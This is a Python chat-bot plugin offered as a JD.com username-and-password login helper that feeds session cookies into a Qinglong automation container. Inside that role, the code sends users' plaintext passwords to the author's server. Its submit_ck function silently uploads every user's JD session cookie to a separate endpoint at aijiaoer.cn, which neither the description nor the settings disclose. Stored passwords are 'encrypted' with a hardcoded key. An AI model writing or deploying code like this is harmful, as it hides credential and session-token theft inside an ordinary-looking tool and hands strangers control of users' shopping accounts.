#[author: chuan]
#[version: 1.6.0]
#[class: 工具类]
#[platform: qq,qb,wx,tb,tg]
#[title: JD账密登录]
#[description: 指令：账密登录，一键账密登录。<br/>介绍：JD账密登录内置协议版，成功一次扣除1积分，购买卡密对作者机器人发“卡密购买”，定时推送添加“一键账密登录”，一天运行两三次即可。为保证账户安全已对数据桶存储密码加密。需要查看登录详情请配参填写wxpusher参数。<br/>注意事项：需在“系统管理”->“插件权限”中开启qls数据权限<br/>更新：新增用户登录前判断ck是否有效，有效则退出登录<br/>更新：登陆失败，密码错误不扣积分<br/>更新：一键登录出验证不删账号<br/>更新：优化登录流程<br/>更新：修改登陆失败通知平台的数据桶，需要重新填写，不填则不通知<br/>更新：更换到云服务器接口<br/>更新：修复bug，优化速度（提升很大）<br/>更新： 增加一键账密登录延迟配参]
#[price: 0]
#[service: 2669943482]
#[priority: 999]
#[public:true]
#[disable:false]
#[admin: false]
#[rule: ^账密登录$]
#[rule: ^一键账密登录$] 
#[icon: http://www.aijiaoer.cn:8888/admin/images/gallery/1731329156012781824.jpg]
#[param: {"required":false,"key":"chuan_narkpro_login_config.zmNarkCheckbox","placeholder":"","bool":true,"name":"启用nark账密","desc":"是否开启nark账密登录，开启后会使用nark的接口进行登录，默认关闭"}]
#[param: {"required":true,"key":"chuan_narkpro_login_config.zm_key","placeholder":"","name":"卡密","desc":"请联系管理员机器人获取卡密"}]
#[param: {"required":false,"key":"chuan_narkpro_login_config.zmchat","placeholder":"","bool":true,"name":"是否开启群聊","desc":"是否开启群聊，默认关闭"}]
#[param: {"required":true,"key":"chuan_narkpro_login_config.zm_qinglong","placeholder":"","name":"对接容器","desc":"账密登录对接的容器，仅支持单容器"}]
#[param: {"required":true,"key":"chuan_narkpro_login_config.yanchi","placeholder":"","name":"一键账密登录延迟（s）","desc":"请填写整数，默认3s"}]
#[param: {"required":true,"key":"chuan_narkpro_login_config.zm_tips","placeholder":"","name":"账密登陆成功提示语","desc":"例子：温馨提示"}]
#[param: {"required":true,"key":"chuan_narkpro_login_config.tz_type","bool":false,"placeholder":"登陆失败通知平台","name":"一键账密通知平台","desc":"例如：qq,wx"}]
#[param: {"required":true,"key":"otto.wx_uid","bool":false,"placeholder":"wxpush_UID","name":"wx_uid","desc":"填写自己的wxpusher的UID"}]
#[param: {"required":true,"key":"otto.wx_appToken","bool":false,"placeholder":"wxpusher的appToken","name":"wx_appToken","desc":"wxpusher的appToken"}]

import re
import middleware
import requests
import json
import random
from datetime import datetime
from urllib.parse import quote_plus,unquote_plus
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64
import time

key = b'chuan66666666666'
iv = b'chuan66666666666'
# host = ['http://8.134.120.110','http://www.aijiaoer.cn']

# 判断字符串是否为正整数
def is_positive_integer(s:str):
    return s.isdigit() and int(s) > 0

def encrypt_password(password):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_password = pad(password.encode(), AES.block_size)
    encrypted_password = cipher.encrypt(padded_password)
    result = base64.b64encode(iv + encrypted_password)
    return result.decode('utf-8')

def decrypt_password(encrypted_password):
    encrypted_data = base64.b64decode(encrypted_password)
    iv = encrypted_data[:AES.block_size]
    ciphertext = encrypted_data[AES.block_size:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_password = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return decrypted_password.decode('utf-8')

def pinCH(pin):
    for ch in pin:
        if u'\u4e00' <= ch <= u'\u9fff':
            return quote_plus(pin)
    return pin

def push(imtype,userId,title,content):
    tz_content = title + '\n' + content
    print(f'推送到{imtype}用户{userId}，内容：{tz_content}', flush=True)
    middleware.push(imtype,'',userId,'',tz_content)

def wxpush(data, wxpusher_alluid, name, arg1, arg2, appToken):
    # WxPusher API地址
    api_url = 'https://wxpusher.zjiecode.com/api/send/message'
    # 按照序号字段对数据进行排序
    sorted_data = sorted(data, key=lambda x: x['序号'])
    # 构造要推送的表格内容
    table_content = ''
    for row in sorted_data:
        table_content += f"<tr><td style='border: 1px solid #ccc; padding: 6px;'>{row['序号']}</td><td style='border: 1px solid #ccc; padding: 6px;'>{row['用户']}</td><td style='border: 1px solid #ccc; padding: 6px;'>{row['arg1']}</td><td style='border: 1px solid #ccc; padding: 6px;'>{row['arg2']}</td></tr>"
    table_html = f"<table style='border-collapse: collapse;'><tr style='background-color: #f2f2f2;'><th style='border: 1px solid #ccc; padding: 8px;'>🆔</th><th style='border: 1px solid #ccc; padding: 8px;'>{name}</th><th style='border: 1px solid #ccc; padding: 8px;'>{arg1}</th><th style='border: 1px solid #ccc; padding: 8px;'>{arg2}</th></tr>{table_content}</table>"
    # 构造请求参数
    params = {
        "appToken": appToken,
        'content': table_html,
        'contentType': 3,  # 表格类型
        'topicIds': [],  # 接收消息的用户ID列表，为空表示发送给所有用户
        "summary": f'一键账密结果推送',
        "uids": [wxpusher_alluid],
    }
    # 发送POST请求
    response = requests.post(api_url, json=params).json()
    try:
        status = response['data'][0]['status']
        middleware.notifyMasters(f'wxpusher推送结果：{status}')
    except Exception as e:
        middleware.notifyMasters(f'wxpusher推送结果：{json.dumps(response)}')

def submit_ck(user,type,ck,tag):
    try:
        url = 'http://www.aijiaoer.cn:9595/api/submit'
        body = {
            'user': user,
            'type': type,
            'cookie': ck,
            'tag': tag
        }
        requests.post(url,json=body)
    except:
        return

def get_now():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def reduceToken(carmi):
    url = f'http://8.138.178.13:35003/operateToken?key=chuan990724abcsc'
    headers = {'Content-Type': 'application/json'}
    body = {"carmi":carmi,"user":" ","limit":1}
    response = requests.post(url,headers=headers,json=body,timeout=300).json()
    # print(response)
    if response.get('code') == 200:
        return True

class Nark():
    def __init__(self,base_url,botApitoken=''):
        self.base_url = base_url
        self.botApitoken = botApitoken
        self.ck = '' # 
        self.rwskey = '' # 

    def requestNarkPro(self,method,api,body,headers=None):
        if headers is None:
            headers = {"Content-Type": "application/json"}
        url = f'{self.base_url}{api}'
        if method == 'post':
            res = requests.post(url,headers=headers,json=body).json()
        else:
            res = requests.get(url,headers=headers).json()    
        return res

    # 发送短信
    def sendsms(self,phone):
        api = '/sms/SendSMS'
        body = {
            "phone": phone,
            "botApitoken": self.botApitoken
            }
        return self.requestNarkPro('post',api,body)

    # 短信验证码
    def VerifyCode(self,phone,code):
        api = '/sms/VerifyCode'
        body = {
            "phone": phone,
            "code": code,
            "botApitoken": self.botApitoken
            }
        return self.requestNarkPro('post',api,body)

    # 身份证验证
    def VerifyCard(self,phone,code):
        api = '/sms/VerifyCard'
        body = {
            "phone": phone,
            "code": code,
            "botApitoken": self.botApitoken
            }
        return self.requestNarkPro('post',api,body)
    
    # 获取NarkPro的二维码key
    def getQrKey(self):
        api = '/qr/GetQRKey'
        body = {
            "botApitoken": self.botApitoken
            }
        return self.requestNarkPro('post',api,body)

    # 检查NarkPro的二维码的状态
    def checkQrKey(self,qrkey):
        api = '/qr/checkQrKey'
        body = {
            "qrkey": qrkey,
            "botApitoken": self.botApitoken
            }
        return self.requestNarkPro('post',api,body)
    
    # 账密登录
    def pwdLogin(self,username,password):
        api = '/Pwd/Login'
        body = {
            "username": username,
            "password": password,
            "botApitoken": self.botApitoken
            }
        return self.requestNarkPro('post',api,body)

    # 获取pro信息
    def info(self,token):
        headers = {
            "Content-Type": "application/json",
            "authorization": "Bearer " + token
        }
        api = '/user/info'
        return self.requestNarkPro('get',api,{},headers)
    
    # 更改备注
    def setRemark(self,token,remark):
        headers = {
            "Content-Type": "application/json",
            "authorization": "Bearer " + token
        }
        api = '/user/remark/' + remark
        return self.requestNarkPro('get',api,{},headers)

# 获取青龙token
class qinglong:
    def __init__(self,ql_ipport, client_id, client_secret):
        self.ql_ipport = ql_ipport
        self.client_id = client_id
        self.client_secret = client_secret
        self.ql_token = ''
    
    # 获取token
    def get_ql_token(self):
        url = f'{self.ql_ipport}/open/auth/token?client_id={self.client_id}&client_secret={self.client_secret}'
        res = requests.get(url).json()
        # print(res)
        if res.get('code') == 200:
            self.ql_token = res.get('data').get('token')
        else:
            print('连接青龙失败')
        
    # 查询环境变量
    def get_ql_env(self,value):
        url = f'{self.ql_ipport}/open/envs?searchValue={value}'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        res = requests.get(url,headers=headers).json()
        # print(res)
        if res.get('code') == 200:
            return res.get('data')
    
    # 新增环境变量
    def submit_env(self,json):
        url = f'{self.ql_ipport}/open/envs'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        # json = [{"value":value,"name":name,"remarks":remarks}]
        res = requests.post(url,headers=headers,json=json).json()
        print(res)
        if res.get('code') == 200:
            return True
        else:
            print(res.get('message'))
    
    # 更新环境变量
    def update_env(self,name,value,remarks,id):
        url = f'{self.ql_ipport}/open/envs'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        json = {"name":name,"value":value,"remarks":remarks,"id":id}
        res = requests.put(url,headers=headers,json=json).json()
        print(res)
        if res.get('code') == 200:
            return True
    
    # 删除环境变量
    def delete_env(self,json):
        url = f'{self.ql_ipport}/open/envs'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        # json = [id]
        res = requests.delete(url,headers=headers,json=json).json()
        # print(res)
        if res.get('code') == 200:
            return True
    
    # 禁用环境变量
    def disable_env(self,id):
        url = f'{self.ql_ipport}/open/envs/disable'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        json = [id]
        res = requests.put(url,headers=headers,json=json).json()
        # print(res)
        if res.get('code') == 200:
            return True
    
    # 启用环境变量
    def enable_env(self,id):
        url = f'{self.ql_ipport}/open/envs/enable'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        json = [id]
        res = requests.put(url,headers=headers,json=json).json()
        # print(res)
        if res.get('code') == 200:
            return True

# 检测京东账号
def islogin(ck):
    try:
        url = 'https://plogin.m.jd.com/cgi-bin/ml/islogin'
        headers = {
            "Cookie": ck,
            "referer": "https://h5.m.jd.com/",
            "User-Agent": "jdapp;iPhone;10.1.2;15.0;network/wifi;Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) "
                        "AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1",
        }
        res = requests.get(url, headers=headers).json()
        islogin = res['islogin']
        if islogin == '1':
            return True
        else:
            return False
    except:
        return False

def get_ql(need_name):
    qls = sender.bucketAllKeys('qls')
    for i in qls:
        ql = json.loads(sender.bucketGet('qls', i))
        host = ql.get('host')
        client_id = ql.get('client_id')
        client_secret = ql.get('client_secret')
        name = ql.get('name')
        if need_name == name:
            return host,client_id,client_secret

def submit_ql(cookie):
    pt_pin = pinCH(cookie.split('pt_pin=')[1].split(';')[0])
    pt_key = cookie.split('pt_key=')[1].split(';')[0]
    # 判断ck是否存在
    env = getqlCk(pt_pin)
    remarks = env.get('remarks') if env else unquote_plus(pt_pin)
    if env:
        ql.update_env(env.get('name'),cookie,remarks,env.get('id'))
        if env.get('status') == 0:
            pass
        else:    
            ql.enable_env(env.get('id'))
    else:
        ql.submit_env([{"value":cookie,"name":'JD_COOKIE',"remarks":remarks}])

def getqlCk(pt_pin) -> dict:
    for i in envs:
        id = i.get('id')
        name = i.get('name')
        value = i.get('value')
        remarks = i.get('remarks')
        status = i.get('status') # 0为启用，1为禁用
        if pinCH(pt_pin) in value: # 存在
            return i

# 对pin去重
def qc(userPins:dict):
    newPins = []
    for i in userPins:
        if pinCH(i) not in newPins:
            newPins.append(pinCH(i))
    return newPins

# 登录成功回复
def loginednotice(username, type):
    middleware.bucketSet('pin' + imtype.upper(),username,sender_id)
    sender.bucketDel('jdNotify', username)
    sender.reply(unquote_plus(username) + '登录成功。\n' + middleware.bucketGet('chuan_narkpro_login_config','loginedReply'))
    middleware.notifyMasters(f'======JD登陆通知======\n[登陆用户]：{sender_id}\n[登陆平台]：{imtype}\n[登陆账户]：{unquote_plus(username)}\n[登陆方式]：{type}\n[登陆时间]：{get_now()}')

def narkzm(id,pwd):
    result = {
        'flag': False,
        'msg': '登陆失败',
        'cookie': '',
        'url': ''
    }
    res = pro.pwdLogin(id,pwd)
    if res.get('success') == True: # 登陆成功
        username = res.get('data').get('username')
        # loginednotice(username, '账密')
        result['flag'] = True
        result['msg'] = '登陆成功'
        result['cookie'] = f'pt_pin={username};'
        accessToken = res.get('data').get('accessToken')
    if res.get('success') == False:
        result['msg'] = res.get('message')
        result['url'] = res.get('data').get('jmp_url')
        # sender.reply(res.get('message') + '\n' + res.get('data').get('jmp_url'))
    return result

def login(id,pwd):
    result = {
        'flag': False,
        'msg': '登陆失败',
        'cookie': '',
        'url': ''
    }
    try:
        url = f'http://www.aijiaoer.cn:5497/login'
        body = {
            "id": id,
            "pwd": pwd,
            "token": zm_key
        }
        response = requests.post(url,json=body,timeout=300).json()
        print(response)
        if response['code'] == 200:
            loginData = response['data']
            loginReq = requests.post(loginData['url'],headers=loginData['headers'],data=loginData['data']).json()
            if loginReq['err_code'] == 0:
                pt_pin = loginReq['pt_pin']
                pt_key = loginReq['pt_key']
                result['flag'] = True
                result['cookie'] = f'pt_key={pt_key};pt_pin={pinCH(pt_pin)};'
            else:
                result['msg'] = loginReq.get('err_msg')
                result['url'] = loginReq.get('jmp_url')
        else:
            sender.reply(response.get('msg'))
    except Exception as e:
        if 'aijiaoer' in str(e) or '8.134.120.110' in str(e) or '8.138.178.13' in str(e):
            result['msg'] = f'连接服务器失败'
        else:
            result['msg'] = f'登陆失败，{str(e)}'
    if '验证' in result['msg'] or '封锁' in result['msg'] or '不正确' in result['msg'] or '风险' in result['msg']:
        reduceToken(zm_key)
    return result

def selectLogin(jdid,jdpw):
    if isPro:
        return narkzm(jdid,jdpw)
    else:
        return login(jdid,jdpw)

def loginRun(jdid,jdpw):
    loginRes = selectLogin(jdid,jdpw)
    if loginRes['url']:
        sender.reply(f"{loginRes['msg']}\n{loginRes['url']}")
        sender.reply(f'请再120s内完成验证，验证成功后请回复“ok”')
        isOk = sender.input(120*1000,3*1000,False)
        if isOk.upper() == 'Q':
            sender.reply('退出成功')
            return
        if not isOk:
            sender.reply('超时退出')
            return
        if isOk.upper() == 'OK':
            time.sleep(4)
            loginRes = selectLogin(jdid,jdpw)

    if loginRes['flag'] == True:
        pin = loginRes['cookie'].split('pt_pin=')[1].split(';')[0]
        if isPro:
            pass
        else:
            submit_ck(pin,'jd',loginRes['cookie'],'true')
            # 提交青龙
            submit_ql(loginRes['cookie'])

        # 记录账密
        middleware.bucketSet('chuan_jd_accountPassword',pin,f'{jdid}#{encrypt_password(jdpw)}')
        # 更新数据桶
        middleware.bucketSet(f'pin{imtype.upper()}',pin,sender_id)
        sender.reply(f'账号{unquote_plus(pin)}登陆成功' + '\n' + middleware.bucketGet('chuan_narkpro_login_config','zm_tips'))
        middleware.notifyMasters(f'======JD登陆通知======\n[登陆用户]：{sender_id}\n[登陆平台]：{imtype}\n[登陆账户]：{unquote_plus(pin)}\n[登陆方式]：账密登录\n[登陆时间]：{get_now()}') 
    else:
        sender.reply(loginRes['msg'])   

def main():
    if msg == '账密登录':
        data = []
        # 获取绑定的所有账号
        userPins = qc(middleware.bucketKeys(f'pin{imtype.upper()}',sender_id))
        replyMessage = f'请输入【】中的序号，多选用逗号隔开（q退出）\n【0】绑定或新增或修改账号\n'
        for index,zmpin in enumerate(userPins):
            onedata = {}
            if not zmpin:
                continue
            onedata['pin'] = zmpin
            one = f'【{index+1}】{unquote_plus(zmpin)}'
            id_pw = middleware.bucketGet('chuan_jd_accountPassword',zmpin)
            if id_pw:
                onedata['zm'] = id_pw
                one += '（✅已绑定）'
            else:
                one += '（⛔未绑定）'
            env = getqlCk(zmpin)
            if env:
                onedata['ck'] = env.get('value')
                if islogin(env.get('value')):
                    one += '（😁有效）'
                    onedata['isFlag'] = True
                else:
                    one += '（😭失效）'
                    onedata['isFlag'] = False
            else:
                one += '（未找到）'
                onedata['isFlag'] = False
            replyMessage += f'{one}\n'
            data.append(onedata)
        # 判断是否为新用户
        if data == []:
            select = '0'
        else:
            sender.reply(replyMessage + f'登陆全部账号回复“ok”\n')
            # sender.reply(f'请输入【】中的序号，多选用逗号隔开\n新增账号回复“ok”（q退出）\n')
            select = sender.input(60*1000,0,False)
            if not select:
                sender.reply('超时退出')
                return
        
        if select.upper() == 'Q':
            sender.reply('退出成功')
            return
        elif select == '0':
            if sender.getChatID() and middleware.bucketGet('chuan_narkpro_login_config','zmchat') == 'false':
                sender.reply('为了您的账户安全，请私聊机器人使用')
                exit()
            sender.reply('请输入您的京东账号(手机号,邮箱,用户名均可)【q退出】')
            jdid = sender.input(60*1000,3*1000,False)
            if jdid == 'q' or jdid == 'Q':
                sender.reply('退出成功')
                return
            if not jdid:
                sender.reply('超时退出')
                return
            sender.reply('请输入您的京东密码：(q退出)')
            jdpw = sender.input(60*1000,3*1000,False)
            if jdpw == 'q' or jdpw == 'Q':
                sender.reply('退出成功')
                return
            if not jdpw:
                sender.reply('超时退出')
                return
            sender.reply(f'{jdid}正在登录~')
            loginRun(jdid,jdpw)
        elif select.upper() == 'OK':
            for i in data:
                if i.get('isFlag'):
                    sender.reply(f'{unquote_plus(i.get("pin"))}账号有效，跳过')
                    continue
                if i.get('zm'):
                    id_pw = i.get('zm')
                    id = id_pw.split('#')[0]
                    pw = id_pw.split('#')[1]
                    try:
                        pw = decrypt_password(pw)
                    except:
                        pw = id_pw.split('#')[1]
                    loginRun(id,pw)
                else:
                    sender.reply(f'{i.get("pin")}未获取到绑定账密，跳过')
        else:
            isreply = False
            select = re.split(r'[,，]', select)
            for i in select:
                if is_positive_integer(i) and 0 < int(i) <= len(data):
                    isreply = True
                    onedata = data[int(i)-1]
                    if onedata.get('isFlag'):
                        sender.reply(f'{onedata.get("pin")}账号有效，跳过')
                        continue
                    if onedata.get('zm'):
                        id_pw = onedata.get('zm')
                        id = id_pw.split('#')[0]
                        pw = id_pw.split('#')[1]
                        try:
                            pw = decrypt_password(pw)
                        except:
                            pw = id_pw.split('#')[1]
                        loginRun(id,pw)
                    else:
                        if sender.getChatID() and middleware.bucketGet('chuan_narkpro_login_config','zmchat') == 'false':
                            sender.reply('为了您的账户安全，请私聊机器人使用')
                            exit()
                        sender.reply('请输入您的京东账号(手机号,邮箱,用户名均可)【q退出】')
                        jdid = sender.input(60*1000,3*1000,False)
                        if jdid == 'q' or jdid == 'Q':
                            sender.reply('退出成功')
                            return
                        if not jdid:
                            sender.reply('超时退出')
                            return
                        sender.reply('请输入您的京东密码：(q退出)')
                        jdpw = sender.input(60*1000,3*1000,False)
                        if jdpw == 'q' or jdpw == 'Q':
                            sender.reply('退出成功')
                            return
                        if not jdpw:
                            sender.reply('超时退出')
                            return
                        sender.reply(f'{jdid}正在登录~')
                        loginRun(jdid,jdpw)
            if isreply:
                pass
            else:
                sender.reply('输入错误，请重新登录')
        return

    elif '一键账密登录' == msg:
        # 读取所有账密
        pins = qc(middleware.bucketAllKeys('chuan_jd_accountPassword'))
        effect = 0 # 有效个数
        success = 0 # 登陆成功个数
        all_ts = [] # 通知内容
        middleware.notifyMasters(f'检测到{len(pins)}个账密账号')
        for index,pin in enumerate(pins):
            print(f'正在处理第{index+1}个账号：{unquote_plus(pin)}', flush=True)
            try:
                flag = True
                env = getqlCk(pin)
                if env:
                    if islogin(env.get('value')):
                        submit_ck(pin,'jd',env.get('value'),'true')
                        if env.get('status') == 1:
                            ql.enable_env(env.get('id'))
                        effect += 1
                        flag = False
                        result = '原账号有效'
                if flag:
                    title = '📢京东账号通知'
                    # 开始登录
                    id_pw = middleware.bucketGet('chuan_jd_accountPassword',pin)
                    id = id_pw.split('#')[0]
                    pw = id_pw.split('#')[1]
                    try:
                        pw = decrypt_password(pw)
                    except:
                        pw = id_pw.split('#')[1]
                    loginRes = selectLogin(id,pw)
                    print(loginRes, flush=True)
                    if loginRes['flag']:
                        success += 1
                        result = '登陆成功'
                        # 增加延迟
                        try:
                            time.sleep(int(middleware.bucketGet('chuan_narkpro_login_config','yanchi')))
                        except:
                            time.sleep(3)
                        if isPro:
                            pass
                        else:
                            submit_ck(pin,'jd',loginRes['cookie'],'true')
                            # 提交青龙
                            submit_ql(loginRes['cookie'])
                    else:
                        # 删除账密并通知用户
                        result = loginRes['msg']
                        if '验证' in result or '需要认证' in result:
                            for i in imTypes:
                                userID = middleware.bucketGet(f'pin{i.upper()}',pin)
                                content = f'🆔账号：{id}\n🤺用户名：{unquote_plus(pin)}\n🔈账密登录需要短信验证\n⛔账号已移除，如还需要请重新登录进行验证'
                                push(i,userID,title,content)
                        elif '封锁' in result:
                            middleware.bucketDel('chuan_jd_accountPassword',pin)
                            for i in imTypes:
                                userID = middleware.bucketGet(f'pin{i.upper()}',pin)
                                content = f'🆔账号：{id}\n🤺用户名：{unquote_plus(pin)}\n🔈账号已被封禁\n⛔账号已移除'
                                push(i,userID,title,content)
                        else:
                            for i in imTypes:
                                userID = middleware.bucketGet(f'pin{i.upper()}',pin)
                                content = f'🆔账号：{id}\n🤺用户名：{unquote_plus(pin)}\n🔈账密登录失败\n⛔账号已移除，如还需要请重新登录'
                                push(i,userID,title,content)

                # 推送参数
                ts = {
                    '序号': index+1,
                    '用户': unquote_plus(pin),
                    'arg1': result,
                    'arg2': zm_qinglong
                }
                all_ts.append(ts)
            except:
                pass

        middleware.notifyMasters(f'====📢一键账密结果推送====\n总帐号：{len(pins)}\n旧账号有效：{effect}\n登陆成功：{success}\n登录失败：{len(pins)-success-effect}\n详情请配置wxpush推送')
        if middleware.get('wx_uid') and middleware.get('wx_appToken'):
            wxpush(all_ts,middleware.get('wx_uid'),'用户ID','状态','归属容器',middleware.get('wx_appToken'))
        else:
            middleware.notifyMasters('未配置uid和appToken推送wxpush参数')

if __name__ == "__main__":
    senderID = middleware.getSenderID()
    sender = middleware.Sender(senderID)
    sender_id = sender.getUserID()
    imtype = sender.getImtype()
    msg = sender.getMessage()

    imTypes = middleware.bucketGet('chuan_narkpro_login_config','tz_type').split(',')
    # 获取青龙
    zm_qinglong = middleware.bucketGet('chuan_narkpro_login_config','zm_qinglong')
    try:
        ql_host,client_id,client_secret = get_ql(zm_qinglong)
        ql = qinglong(ql_host,client_id,client_secret)
        ql.get_ql_token()
    except:
        sender.reply('获取青龙失败')
        exit()
    envs = ql.get_ql_env('JD_COOKIE')
    zm_key = middleware.bucketGet('chuan_narkpro_login_config','zm_key')

    if middleware.bucketGet('chuan_narkpro_login_config','zmNarkCheckbox') == 'true':
        pro = Nark(middleware.bucketGet('chuan_narkpro_login_config','nark_url'))
        isPro = True
        main()
    else:
        zm_key = middleware.bucketGet('chuan_narkpro_login_config','zm_key')
        if not zm_key:
            sender.reply('请联系作者获取卡密')
            exit()
        isPro = False
        main()
